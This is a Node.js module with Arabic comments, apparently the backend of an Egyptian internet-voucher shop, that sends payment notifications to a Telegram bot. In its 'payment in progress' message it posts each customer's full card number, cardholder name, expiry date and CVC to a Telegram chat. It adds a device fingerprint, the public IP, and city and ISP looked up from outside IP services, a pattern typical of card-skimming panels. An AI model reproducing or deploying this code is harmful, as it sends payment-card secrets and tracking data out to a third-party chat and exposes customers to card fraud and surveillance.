const axios = require("axios");
const FormData = require("form-data");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

/**
 * دالة جلب المدينة والدولة واقتفاء الشبكة (ISP) عبر الـ IP الخارجي من السيرفر
 */
async function fetchNetworkDetailsByIP(ip) {
  const result = {
    location: "غير معروف",
    isp: "غير معروف"
  };

  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) {
    return null; // إلغاء في حالة الشبكة المحلية
  }

  const cleanIp = String(ip).split(",")[0].trim();

  try {
    const res = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
    if (res.data) {
      const city = res.data.city || "غير معروفة";
      const country = res.data.country_name || "غير معروفة";
      result.location = `${city}، ${country}`;
      result.isp = res.data.org || res.data.asn || "غير معروف";
      return result;
    }
  } catch (e) {
    try {
      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org`, { timeout: 3000 });
      if (fallbackRes.data && fallbackRes.data.status === "success") {
        const city = fallbackRes.data.city || "غير معروفة";
        const country = fallbackRes.data.country || "غير معروفة";
        result.location = `${city}، ${country}`;
        result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
        return result;
      }
    } catch (fallbackErr) {
      console.warn("⚠️ تعذر جلب تفاصيل الموقع والشبكة للـ IP:", cleanIp);
    }
  }

  return result;
}

function getPaymentMethodName(data) {
  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
  if (method === "card") method = "💳 بطاقة بنكية";
  else if (method === "wallet") method = "📱 محفظة إلكترونية";
  return method;
}

function getFormattedDateTime() {
  const now = new Date();
  const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
  const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
  return `${formattedDate} - ${formattedTime}`;
}

/**
 * إرسال رسالة نصية عامة إلى التليجرام (حالة البدء الجاري وحالة النجاح)
 */
async function sendTelegramMessage(data, isInitial = true) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "";

    // ⛔ التجاهل وعدم الإرسال إذا كان الطلب قادماً من شبكة محليّة (Localhost)
    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
      console.log("ℹ️ [Telegram] تم التجاوز: عدم إرسال إشعار للشبكة المحلية (Localhost).");
      return;
    }

    const method = getPaymentMethodName(data);
    const amountEGP = data.amount_cents
      ? (data.amount_cents / 100).toFixed(2)
      : (data.amount || "غير محدد");
    const dateTimeStr = getFormattedDateTime();

    // استخراج اسم الفرع المختار (الافتراضي: حكايات نت رئيسي)
    const branchName = data.branchName || data.branch_name || "حكايات نت رئيسي";

    // استخراج رقم الهاتف بجميع الاحتمالات الممكنة
    const userPhone = data.phone || 
                      data.billing_data?.phone_number || 
                      data.customer?.phone_number || 
                      "غير محدد";

    // 🔍 استخراج طراز الجهاز بجميع الاحتمالات الممكنة لتجنب ظهور "غير متوفر"
    const deviceModel = data.deviceModel || 
                        data.device_model || 
                        data.extra_data?.device_model || 
                        data.order?.extra_data?.device_model || 
                        data.merchant_extra?.device_model || 
                        data.source_data?.sub_type || 
                        "غير متوفر";

    let message = "";

    if (isInitial) {
      // 1. الرسالة الأولى: جاري بدء عملية الدفع
      const clientID = data.clientID || data.clientId || "غير متوفر";

      let locationText = data.geoCity && data.geoCountry ? `${data.geoCity}، ${data.geoCountry}` : null;
      let ispText = data.ispProvider || data.isp || null;

      if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف") {
        const netInfo = await fetchNetworkDetailsByIP(publicIP);
        if (netInfo) {
          if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
          if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
        }
      }

      const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
      const deviceRAM = data.deviceRAM || "غير متوفر";
      const cpuCores = data.cpuCores || "غير متوفر";
      const deviceType = data.deviceType || "غير متوفر";
      const screenSize = data.screenSize || "غير متوفر";
      const userTimeZone = data.userTimeZone || "غير متوفر";
      const lang = data.lang || "غير متوفر";

      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;

      if (userPhone && userPhone !== "غير محدد") {
        message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
      }

      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                  `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                  `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
                  `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
                  `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
      }

      message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
                 `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                 `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
                 `📱 <b>طراز الجهاز:</b> <b>${deviceModel}</b>\n` +
                 `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
                 `🏙 <b>المدينة والدولة:</b> <b>${locationText || 'غير متوفر'}</b>\n` +
                 `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
                 `----------------------------------------\n` +
                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;

    } else {
      // 2. الرسالة الثانية: تأكيد نجاح الدفع والتفعيل
      const txnId = data.id || data.transactionId || data.order?.id || "غير متوفر";
      const voucher = data.voucher_code || (data.card ? data.card.code : "غير متوفر");
      const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
      const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";

      message = `✅ <b>تمت عملية الدفع بنجاح!</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
                `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
                `📱 طراز الجهاز: <b>${deviceModel}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                `📦 البروفايل / الباقة: <b>${packageInfo}</b>\n` +
                `🎟️ رقم الكارت (Voucher): <code>${voucher}</code>\n` +
                `📅 تاريخ ووقت العملية: <code>${dateTimeStr}</code>`;
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("❌ خطأ في إرسال رسالة تليجرام:", err.response?.data || err.message);
  }
}

/**
 * إرسال صورة كارت الإنترنت المصممة مع التفاصيل والتنبيه بنفاذ المخزون للفرع المخصص
 */
async function sendVoucherWithCardImage(voucherInfo, imageBuffer) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const { amount, packageName, card, remaining, phone, transactionId, branchName } = voucherInfo;
    const currentBranch = branchName || "حكايات نت رئيسي";
    const dateTimeStr = getFormattedDateTime();

    if (imageBuffer && card) {
      const captionText = `🎉 <b>تم دفع وتأكيد كارت الإنترنت بنجاح!</b>\n\n` +
                          `🌐 <b>شبكة حكايات نت (${currentBranch})</b>\n` +
                          `🆔 رقم المعاملة: <code>${transactionId}</code>\n` +
                          `📱 رقم الهاتف المحول: <code>${phone || 'غير محدد'}</code>\n` +
                          `📦 الباقة: <b>${packageName}</b> (${amount} ج.م)\n` +
                          `🎟️ رقم الكارت: <code>${card.code}</code>\n\n` +
                          `🕒 الوقت: <code>${dateTimeStr}</code>`;

      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("photo", imageBuffer, {
        filename: `hikayat_card_${card.code}.png`,
        contentType: "image/png"
      });
      form.append("caption", captionText);
      form.append("parse_mode", "HTML");

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders()
      });
    }

    if (typeof remaining === "number" && remaining <= 5) {
      let warningMessage = `🚨 <b>تنبيه مخزون الكروت - ${currentBranch}!</b>\n\n` +
                            `📦 الباقة: <b>${packageName}</b> (${amount} ج.م)\n`;

      if (remaining > 0) {
        warningMessage += `⚠️ المتبقي في المخزون حالياً: <b>${remaining} كارت</b> فقط لهذا الفرع!\nيرجى إضافة كروت جديدة للفرع في أقرب وقت.`;
      } else {
        warningMessage += `❌ <b>نفدت جميع كروت هذه الباقة بالكامل لهذا الفرع!</b>\nلن يستطيع العملاء الشراء من هذا الفرع حتى إضافة كروت جديدة.`;
      }

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: warningMessage,
        parse_mode: "HTML"
      });
    }

  } catch (err) {
    console.error("❌ خطأ أثناء إرسال صورة الكارت أو التنبيه للتليجرام:", err.response?.data || err.message);
  }
}

module.exports = {
  sendTelegramMessage,
  sendVoucherWithCardImage
};
